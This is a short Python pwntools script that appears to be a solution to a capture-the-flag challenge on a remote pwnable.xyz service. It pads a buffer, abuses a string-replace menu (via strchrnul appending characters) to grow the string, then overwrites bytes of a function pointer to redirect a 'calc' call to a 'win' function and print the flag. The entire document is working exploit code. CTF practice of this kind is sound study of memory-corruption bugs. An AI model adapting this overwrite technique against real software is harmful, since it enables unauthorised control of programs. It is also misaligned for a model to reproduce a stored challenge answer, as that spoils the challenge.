from pwn import *

# p = process('./challenge')
p = remote('svc.pwnable.xyz', 30015)

def change(target, replace):
    p.sendlineafter('> ', '5')
    p.sendlineafter(': ', target)
    p.sendlineafter(': ', replace)

p.sendafter(': ', 'a'*0x7f)

# if replace char not exist in str strchrnul would extend new char at the end
# so use strchrnul to extend the str to overwrite function pointer
change('A', 'A')
change('B', 'B')
change('C', 'C')
change('D', 'D')
change('E', 'E')

# hijack calc to win
change(b'\x6b', b'\xf3')
change(b'\x0d', b'\x0c')

p.sendlineafter('> ', '1')

print(p.recvuntil('}'))